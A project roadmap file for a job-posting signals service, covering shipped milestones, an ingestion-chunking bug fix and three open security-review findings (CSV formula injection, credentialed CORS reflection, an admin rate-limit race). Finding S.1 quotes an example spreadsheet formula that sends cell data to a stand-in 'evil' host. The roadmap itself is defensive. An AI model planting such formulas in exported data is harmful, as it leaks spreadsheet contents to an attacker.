# ROADMAP.md

Detailed, sequenced task breakdown for work remaining on HiringSignals.
`AGENTS.md` keeps the short status view and repo-wide policy; this file
is where a phase gets broken into ordered, independently-verifiable
tasks before anyone starts writing code.

Source of truth for *behavior* is always `hiring-signals-spec.md` —
every task cites the spec section it implements. If a task and the
spec disagree, the spec wins and this file gets corrected.

**Status summary (last updated 2026-08-16):** All originally scoped
milestones (Phase 0 → R, G.1–G.5) are shipped and verified. Full
narrative/evidence for completed work lives in git history and
`CHANGELOG.md` — this file keeps only short landed-summaries plus the
items still genuinely open below.

**Open-item count: 5**:
1. G.3 — root cause found and fixed in code (`SubrequestBudget`),
   deployed 2026-08-16. First live `openai` run under the new code
   completed successfully the same day (see below) — one data point,
   not yet the "a few real production runs" bar the diagnostic
   checkpoint's own removal condition sets. Watch a few more cron
   cycles before removing it.
2. G.4 — "never point preview/staging at prod secrets" — a standing
   guardrail, deliberately kept unchecked, not a task to build today.
3. S.1 — CSV export formula-injection escaping (spec §11.1).
4. S.2 — CORS reflects Origin + sets Allow-Credentials unconditionally
   (spec §11.1).
5. S.3 — admin-auth strike counter has an unprotected KV race
   (spec §11.1).

---

## How to use this file

- Work top to bottom within a milestone; milestones are ordered by
  hard dependency.
- A task is only checked off once code is written, the cited spec
  section re-read against what was built, and the listed verification
  command run with a real passing result.
- If a task turns out bigger than it looks, stop and split it into
  sub-tasks here rather than quietly expanding scope inside one commit.
- Update `CHANGELOG.md` when a milestone completes.

---

## Shipped milestones (summary only — see git history / CHANGELOG.md)

- **Phase 0–1, A–M**: scaffolding, D1 schema, write-path repos,
  classification/lifecycle, signal generation, scheduler/queue/ops
  scripts, 8 ATS adapters, dashboard (built then deleted 2026-08-07 in
  favor of the CLI), security audit + gap closure (G.1–G.2),
  signal-quality pass, semantic search (I.1–I.5), live-D1 test
  migration (J), `still_active` signal + latency metric (K), CSV
  export (L), bulk CSV import (M).

- **F.1 — CLI (`apps/cli`), primary interface.** Complete, landed
  2026-08-07. `apps/cli` is the intended entry point for an agent
  (JSON-by-default, machine-readable errors, no interactive prompts,
  thin client over `apps/api`). `--format table` fallback added
  2026-08-10 for human debugging (JSON stays default/unchanged).
  See `apps/cli/README.md` for exact invocations.

- **G.3 — Performance targets verification (spec §12).** Verified
  2026-08-05/11: page size ≤50 confirmed, Queues/D1 headroom not in
  question at current volume, uncached latency comfortably under
  target. Ingestion success/duplicate-rate measurement surfaced two
  real bugs, both root-caused and fixed same window: (a) stuck
  `source_runs` rows from exhausting the 1000-subrequest platform cap
  on large boards — fixed 2026-08-11 by batching the upsert/lifecycle
  D1 write pair (commit `7512473`); (b) `source-health.mjs` couldn't
  detect the stuck state — fixed same day with a `running_minutes`
  staleness check. One follow-up remains genuinely open — see below.

- **G.4 — CI/CD hardening (spec §15).** Environment scope decided
  2026-08-06 (stays simplified: Local + Production only, no
  Preview/Staging tier). Lint zero-warning enforced repo-wide.
  Rollback mechanically available (`wrangler rollback`), never
  drill-tested — low priority. Feature-flag gap for scoring-formula
  changes recorded as accepted, not built (no second formula in
  flight). One guardrail checkbox retained — see below.

- **G.5 — Acceptance criteria sign-off (spec §16).** Fully walked and
  PASS end to end, 2026-08-11. All 6 sub-items (§16.1–§16.3.6) passed
  live verification; 3 real gaps found and fixed in the process:
  custom-host port-injection bypass in `breezy`/`personio` adapters
  (§16.3.2), missing path-param schema validation on signal/company
  detail routes (§16.3.3), and no API-error-rate monitoring — closed
  by adding an Analytics Engine binding + `api-metrics.ts` middleware
  (§16.3.6).

- **N — Saved filter profiles (`apps/cli` local config file).**
  Complete, landed 2026-08-07. `~/.hiring-signals/config.json`
  (or `$XDG_CONFIG_HOME` equivalent); `--save`/`--clear-saved` flags
  on `hs signals list`, auto-applied when no filter flags given.

- **O — Company hiring timeline (API + CLI).** Complete, landed
  2026-08-08. `GET /api/v1/companies/:slug/timeline` (bucketed
  new/closed/active jobs, role/location breakdown, 90-day window cap)
  + `hs companies timeline <slug>`.

- **P — Cross-company hiring trend API + CLI.** Complete, landed
  2026-08-09. Industry tagging via `update-company.mjs` (P.1);
  `GET /api/v1/trends/hiring` ranked by acceleration/volume/velocity
  (P.2); `hs trends hiring` (P.3).

- **Q — Company-level hiring velocity score.** Complete, landed
  2026-08-09. `computeHiringVelocity` (acceleration/breadth/volume/
  persistence weighted formula) persisted to `companies.hiring_
  velocity_score`; recomputed in daily reconciliation; surfaced in
  trends API, company API, and CLI with the required spec §11.3
  disclaimer.

- **R — RSS feed (`GET /api/v1/feed.rss`).** Complete, landed
  2026-08-07. `buildRssFeed` serializer (R.1), route with ETag/
  Last-Modified/304 support (R.2), `hs feed-url` for discoverability
  (R.3).

---

## Open work

### G.3 follow-up — per-chunk-kill root cause (fix deployed, awaiting live confirmation)

**Status as of 2026-08-16:** Root cause found and fixed in code
2026-08-15; committed and deployed 2026-08-16. Not yet closed — needs
one real `openai` cron cycle observed post-deploy before the temporary
diagnostic checkpoint comes out and this item is checked off.

Context, briefly: `openai`'s board (700+ jobs, Ashby) kept dying
mid-run even after two real bugs were found and fixed in this
milestone — (1) subrequest-cap exhaustion on the upsert/lifecycle
write pair, fixed via `db.batch()`; (2) runs stacking indefinitely
because `next_poll_at` never advanced on an incomplete run, fixed via
`hasRecentRunningRun` scheduler guard (commit `35b6824`, deployed
2026-08-14 as version `6f82cd4a`). That second fix stopped the
stacking and let a single `openai` run be observed in isolation for
the first time — but it still stalled partway through with **zero
JS-catchable error and no `source_runs.error_code` ever populated**.

**Root cause (found 2026-08-15):** `JOBS_PER_CHUNK=40` was a fixed
job-count ceiling sized against a single "~14 subrequests/job
worst-case" estimate, but real per-job cost varies sharply — an
unchanged existing job returns early after ~2 D1 calls, while a
brand-new job pays the full ~14-call path. A 40-job chunk landing
disproportionately on new jobs (exactly what an unpolled board like
`openai`'s produces on its first run) could still blow the real
1,000-subrequest-per-invocation cap mid-chunk, below the JS layer
entirely.

**Fix:** stop estimating, start counting. `SubrequestBudget`
(`apps/api/src/jobs/ingest-consumer.ts`) tracks the real number of
Cloudflare-service calls issued so far this invocation, threaded
through `processNormalizedJob` and its callees. The chunk loop checks
remaining budget before each job and breaks — re-enqueuing the exact
next unprocessed job as the next chunk's offset — once
`SUBREQUEST_SAFETY_MARGIN=700` is reached, regardless of job count.
Self-correcting against real per-job cost variance instead of a
static guess. `JOBS_PER_CHUNK=40` kept as a secondary hard backstop
ceiling, not the primary boundary anymore. 6 new pure-function tests
(`apps/api/test/jobs/ingest-consumer-budget.test.ts`) covering the
budget math in isolation, since `ingest-consumer.test.ts` itself is
live-D1/manual-only.

- [x] **Root-cause and fix the silent per-chunk kill.** Committed
      (`12ae111`) and deployed 2026-08-16 (Worker version
      `d9960f2a-bb0c-4e67-a8c1-173496c466f1`). `pnpm -r typecheck`
      clean across all 6 workspace packages; `apps/api` lint
      zero-warning clean; `ingest-consumer-budget.test.ts` 6/6 passing.
- [x] **First live confirmation (2026-08-16).** Watched run
      `2dbb7ed4-44bd-40cc-921b-2fef7a544b13` (started
      2026-08-16T20:15:50.318Z, the first `openai` cron tick after
      deploy) through 4 continuation chunks — `jobs_normalized`
      progressed 400 → 640 → 720 → 746, reaching
      `status='success'`/`completed_at` at 20:33:39Z, `duration_ms`
      46641. `markSourceSuccess` fired correctly: source row's
      `last_success_at`/`next_poll_at` both populated (next poll ~6h
      out, matching `poll_interval_minutes`). First time in this
      incident's history an `openai` run has ever reached a terminal
      success state. Also found and closed 69 pre-fix orphaned
      `status='running'` rows (hourly since 2026-08-14, i.e. the
      `hasRecentRunningRun` guard's 45-min staleness window kept
      re-triggering hourly rather than stacking sub-hour, but the
      underlying per-run kill this fix addresses meant none of those
      hourly attempts ever completed) — same cleanup pattern as the
      577-row incident, `error_code='abandoned_run_cleanup'`.
- [ ] **Remove the temporary diagnostic checkpoint.**
      `recordSourceRunProgress`'s own removal condition is "a few real
      production runs," plural — one successful run (above) is a
      strong signal but not yet that bar. Watch 2-3 more `openai` cron
      cycles reach `status='success'` cleanly, then remove the
      checkpoint (`packages/db/src/sources-repo.ts`, called from the
      chunk loop every `PROGRESS_CHECKPOINT_INTERVAL=10` jobs in
      `apps/api/src/jobs/ingest-consumer.ts`) and close this item.

### G.4 — standing guardrail (not active work)

- [ ] If any deploy automation is ever added: never point preview/
      staging at production secrets or write bindings (spec §15.1).
      Currently moot — the environment-scope decision above rules out
      a separate preview/staging tier — but kept here as an explicit
      constraint in case that decision is ever revisited. Not a task
      to schedule.

### S — code review findings (2026-08-16, security/data-integrity pass)

Three issues found during a manual review of `apps/api`, `packages/db`,
and `packages/adapters` (not tied to a prior incident — proactive pass).
All three map to spec §11.1's own stated bar ("Escape/sanitize untrusted
job descriptions," "appropriate...headers," general security-controls
list), so these are drift from the spec, not new scope.

- [ ] **S.1 — CSV export is vulnerable to formula injection.**
      `lib/text/csv.ts`'s `escapeCsvField` only implements RFC 4180
      quoting (comma/quote/newline). It does not neutralize a leading
      `=`, `+`, `-`, `@`, tab, or CR, which Excel/Sheets/LibreOffice
      treat as a formula trigger on cell open — a documented,
      named vulnerability class (CSV injection, OWASP). `company_display_name`
      and `headline` (exported via `apps/api/src/routes/export.ts`'s
      `GET /api/v1/export/signals.csv`) both trace to unsanitized
      upstream ATS data — confirmed via `packages/adapters/src/greenhouse.ts`,
      where `title: job.title` passes through with only `z.string()`
      validation, no content restriction. Any company listed on a
      source ATS can set its own display name or a job title to a
      formula string (e.g. `=HYPERLINK("http://evil/"&A1,"click")`),
      and it reaches the exported CSV verbatim; anyone opening the file
      in Excel gets a live formula, not text.
      Fix: in `escapeCsvField`, prefix fields whose first character is
      `=`, `+`, `-`, `@`, tab, or CR with a leading `'` before the
      existing RFC-4180 quoting logic runs. Add a fixture test with a
      `=`-leading company name asserting the output cell is
      neutralized.
- [ ] **S.2 — CORS reflects any Origin *and* sets
      `Access-Control-Allow-Credentials: true`.**
      `apps/api/src/middleware/security-headers.ts`'s `securityHeaders()`
      reflects the request's `Origin` header verbatim (by design,
      per that file's own comment — this API is intentionally
      open-access, spec §11.1) but also unconditionally sets
      `Access-Control-Allow-Credentials: true` whenever an `Origin`
      header is present. Reflected-origin + credentials=true is the
      specific pattern used to defeat the browser's own wildcard+
      credentials block — inert today since no route sets cookies or
      reads an Authorization header from a browser context, but a
      landmine: the day any credentialed flow is added to this Worker,
      every origin on the internet becomes a trusted credentialed
      reader of that response, and nothing about this file's current
      shape would flag it as newly dangerous.
      Fix: remove the unconditional
      `c.header("Access-Control-Allow-Credentials", "true")` line.
      Reflecting Origin alone is fine for a public, unauthenticated
      API — only the combination with credentials=true is the problem.
      Re-add credentials=true only alongside whatever future change
      actually introduces a credentialed route, scoped to real
      allowed origins at that point, not blanket reflection.
- [ ] **S.3 — Admin-auth strike counter has an unprotected
      read-then-write race.** `apps/api/src/middleware/admin-auth.ts`'s
      `addStrike` does a bare `kv.get` (via `loadStrikes`) followed by
      a plain `kv.put(strikes + 1, ...)` with no atomicity between the
      two. `lib/http/rate-limit.ts`'s `checkRateLimit` — used one
      layer over in `middleware/anti-abuse.ts` — already documents
      this exact KV get→put race in its own header comment and closes
      it via `incrementActiveShard` (uses the KV runtime's atomic
      `increment` where available, falls back to a bounded-loss client
      put otherwise). `admin-auth.ts` predates or was never updated to
      match that fix. Effect: a burst of concurrent wrong-password
      attempts from the same IP can read the same prior `strikes`
      value before any of them write, undercounting strikes and
      stretching the 3-attempt/60s lockout past its intended
      threshold. Low severity on its own (ADMIN_SECRET is still
      constant-time compared regardless — see
      `timingSafeEqualStrings` — so this only weakens brute-force
      throttling, not the credential check itself), but it's a real
      gap between two files that clearly already know about the same
      problem class.
      Fix: route `addStrike` through `incrementActiveShard` (or call
      `checkRateLimit` directly with an admin-specific
      `RateLimitParams`) instead of the current raw `kv.put`.
